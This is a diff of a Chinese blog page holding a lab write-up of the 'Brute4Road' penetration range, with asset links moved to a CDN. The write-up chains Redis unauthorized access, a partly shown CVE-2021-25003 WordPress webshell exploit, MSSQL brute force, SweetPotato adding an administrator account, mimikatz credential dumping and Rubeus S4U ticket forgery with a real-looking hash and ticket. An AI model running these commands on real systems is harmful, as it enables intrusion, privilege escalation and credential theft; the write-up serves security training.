@@ -5,10 +5,10 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width,initial-scale=1.0" />
-    <link rel="icon" href='/static/favicon.ico' type="image/x-icon">
+    <link rel="icon" href='https://static.dionysus.zip/static/favicon.ico' type="image/x-icon">
     <title>Brute4Road - MoonlitSyntax</title>
 
-    <link rel="stylesheet" href='/static/css/app-VZKXMC7L.css'>
+    <link rel="stylesheet" href='https://static.dionysus.zip/static/css/app-VZKXMC7L.css'>
 
 
     <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -61,12 +61,12 @@
             </div>
         </header>
 
-        <article class="c-post__content prose"><p><div class="c-img" data-full="/static/z-img/Pasted%20image%2020240111154806.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="/static/z-img/Pasted%20image%2020240111154806.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+        <article class="c-post__content prose"><p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240111154806.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240111154806.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
 <p>首先fscan扫描发现到redis未授权,使用脚本反弹shell</p>
 <p>然后suid提权<code>find / -user root -perm -4000 -print 2&gt; result.txt</code></p>
 <p>发现base64具有权限<code>base64 &quot;/home/redis/flag/flag01&quot; | base64 --decode</code>即可获得第一个flag</p>
 <p>挂好代理</p>
-<p><div class="c-img" data-full="/static/z-img/Pasted%20image%2020240111164119.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="/static/z-img/Pasted%20image%2020240111164119.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240111164119.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240111164119.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
 <p><code>proxychains wpscan --url http://172.22.2.18</code>发现有插件漏洞CVE-2021-25003</p>
 <div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">python</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="python"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">binascii</span>
@@ -94,27 +94,27 @@
 </span></span><span class="line"><span class="cl">    <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">destination_url</span><span class="si">}</span><span class="s2">webshell.php?1=system&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;2&#34;</span><span class="p">:</span> <span class="n">cmd</span><span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">)</span><span class="o">.</span><span class="n">content</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;ascii&#39;</span><span class="p">,</span> <span class="s1">&#39;ignore&#39;</span><span class="p">))</span>
 </span></span></code></pre></div></div><p>直接打</p>
-<p><div class="c-img" data-full="/static/z-img/Pasted%20image%2020240111164845.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="/static/z-img/Pasted%20image%2020240111164845.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240111164845.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240111164845.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
 <p>打完之后写蚁剑,查找配置文件链接数据库后发现第二个flag,除此外还有密码表</p>
 <p>是mssql的密码,爆破得到密码后
 MDUT启动</p>
-<p><div class="c-img" data-full="/static/z-img/Pasted%20image%2020240111172012.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="/static/z-img/Pasted%20image%2020240111172012.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240111172012.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240111172012.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
 <p>然后 Ole Automation Procedures 激活成功</p>
-<p><div class="c-img" data-full="/static/z-img/Pasted%20image%2020240111172245.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="/static/z-img/Pasted%20image%2020240111172245.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240111172245.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240111172245.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
 <div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">bash</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="bash"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">C:/Users/Public/sweetpotato.exe -a <span class="s2">&#34;net user fushuling qwer1234! /add&#34;</span> 
 </span></span><span class="line"><span class="cl">C:/Users/Public/sweetpotato.exe -a <span class="s2">&#34;net localgroup administrators fushuling /add&#34;</span>
 </span></span><span class="line"><span class="cl">
 </span></span></code></pre></div></div><p>加用户rdp过去</p>
 <p>老位置拿到flag</p>
-<p><div class="c-img" data-full="/static/z-img/Pasted%20image%2020240111172520.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="/static/z-img/Pasted%20image%2020240111172520.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
-<p>然后复制<div class="c-img" data-full="/static/z-img/Pasted%20image%2020240111173810.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="/static/z-img/Pasted%20image%2020240111173810.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240111172520.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240111172520.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p>然后复制<div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240111173810.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240111173810.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
 <p>拿到<code>privilege::debug</code> <code>sekurlsa::logonpasswords</code></p>
 <p>通过 S4U 伪造高权限 ST 拿下域控,用Rubeus申请访问自身的服务票据</p>
-<p><div class="c-img" data-full="/static/z-img/Pasted%20image%2020240111173747.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="/static/z-img/Pasted%20image%2020240111173747.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240111173747.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240111173747.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
 <p><code>Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:a7905626907766f2f194959fdb48e1c8 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap</code></p>
-<p><div class="c-img" data-full="/static/z-img/Pasted%20image%2020240111174223.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="/static/z-img/Pasted%20image%2020240111174223.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240111174223.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240111174223.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
 <p><code>Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE2NAMQwjN0euTL2K0mYmuybf8gRxGV3xKqwt9M+BRmLNyVHJ8O0PPydV5hYS0i4y0b6ERrLEGX5YOOc5YyTdzkZiTs6pWrLQj51XMISjQbROYeKp0kWaZLCLGHe+Muc8CSe/NIDUiosKVe+LgFj2YoDASf3zL5ShJGPSsASnsBY6RCTV6XzSoLWYsoLVzQSe7uuSy9tv6yTkv58k6YwvdmD4h4rmXVaKT52m9rKjiMmLU2S/V6jGlcb98fFBmqZwCEINZ/F0uGjQ5CIwFdHpn19m0RUHyawcVBRVUF1y8ZBdpfsaRWbNkiCxlRBXJ+g/U6hTqBfRgU3npoqz8oRG7HuA6nky4DamRdSQHoIrfjCgRFEdtvXO9Cnnwb5H9/BQUxp/6dTbwd6Y1dMivtB0UBW5YKPayE2Ze6tNOlyJ/Ll1bPvxoSsfj2bxWtR2zhoFVOrBrv9+rzoWnqoKV9zwLZnaTfzLiA6zKqZZld2OOnm60ehfkbQbGRJBPrjKpTMYG1n0BXsOH4qcFvOqXW8iYkIdymuQgEyT3ufd7pe44K5fDQG7sGKS7gZUdYJMJmY0ZNfZMgsejRyLH4lWm3/zqbgSv9EmWZ7wK3kMB7DUDfUvY7n1mhlQrR8meLO65ryDTRjt7a9YhR2mpT8oDMEw3SUJFFCc5+DXyD+3NOQKpavfq0KtGUUKcQzV53six4UCzxAS10Qm0THmWgiZ6MzE1SZwTca5YE4JvKJ4rGxHiTYsXDxCgrthf72Ddb+xM6H/I+qFIFBkPjjU9JKP1UEddWQut5BumidoEz+D8VLsrrKHqFBw0lc/HZuFHFNzZSdcyf8dqXXbb79rjIK40YH264+0HhZF5LeHdjl3tV7ryE+Mj9OnTOnWPPrhlwjBxX5AhD6LmGJNfiuIAWKPRvXYTHgVKmm01c4tRaPq5x0+eW+rh8TquSf/BnTJXRK4mg6/kI8LY6wvDOmoJdh4xvms960n/EH5FhczMwjF3j4u2ab5JR1ujTct5aEMDofh04ZLIomoYuMQ2TbIi33OrQ8anUzg2jneOBOkw+opsJYY/PELf37PN+/aCnIdfR+u0/GNRjqpRH/Kq7bI5impRnM7vxz0yAxoAnuRsFKj+ALLjHE/QFdMsta0Wx1RroJa9RJ6avSv+mjwwQy2AnyRh1dEaofg9fILBjLqdrPIVA9alylR2EARnUueYN75oMZwJq4AD1arAVinSn9VMxWRV4tAx3Wl+Yq9xgcaYKvWrD3Uk+TlyuZ0L+xtmjjNrL502DNausiI9HJBdWDwvY+5AQGDwAVvcSeZeeWFCDMleSF4wi2YkgUV6SV0l6PpKBFqyaxyO8clLm8tndPb+bRuCL/kNGblUrSxZ0ih7utz/qSlXWxPzd+tmOEg5Nfs7qwgtPxlwKy8Y8jdS0ZQ2wZCosMKHJHjsWafNo+Xadb6sXX9CmyzhSlP0io/FqH2gblMLSjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBCSJYfAkBcTVbjKHIzVWj/VoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI0MDExMTA5NDE0N1qmERgPMjAyNDAxMTExOTQxNDdapxEYDzIwMjQwMTE4MDk0MTQ3WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==</code></p>
-<p><div class="c-img" data-full="/static/z-img/Pasted%20image%2020240111174806.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="/static/z-img/Pasted%20image%2020240111174806.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240111174806.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240111174806.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
 <p>这样就算是拿到了</p>
 <p><code>type \\DC.xiaorang.lab\C$\Users\Administrator\flag\flag04.txt</code></p>
 <p><code>flag{69371bca-db8c-46a6-8580-3d4eea725228}</code></p>
@@ -122,16 +122,16 @@ MDUT启动</p>
 
         <nav class="c-post__nav">
             
-            <a href="/post/greatwall" class="c-post__nav-card c-post__nav-card--prev">
+            <a href="/post/flarum" class="c-post__nav-card c-post__nav-card--prev">
                 <h3>‹ 上一篇</h3>
-                <p class="c-post__nav-title">GreatWall</p>
+                <p class="c-post__nav-title">Flarum</p>
             </a>
             
 
             
-            <a href="/post/privilege" class="c-post__nav-card c-post__nav-card--next">
+            <a href="/post/delivery" class="c-post__nav-card c-post__nav-card--next">
                 <h3>下一篇 ›</h3>
-                <p class="c-post__nav-title">privilege</p>
+                <p class="c-post__nav-title">Delivery</p>
             </a>
             
         </nav>
@@ -159,7 +159,7 @@ MDUT启动</p>
     </div>
 </div>
 
-<script src='/static/js/app-IJHRYWUS.js' defer></script>
+<script src='https://static.dionysus.zip/static/js/app-IJHRYWUS.js' defer></script>
 
 
 <script src="https://cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js" defer></script>
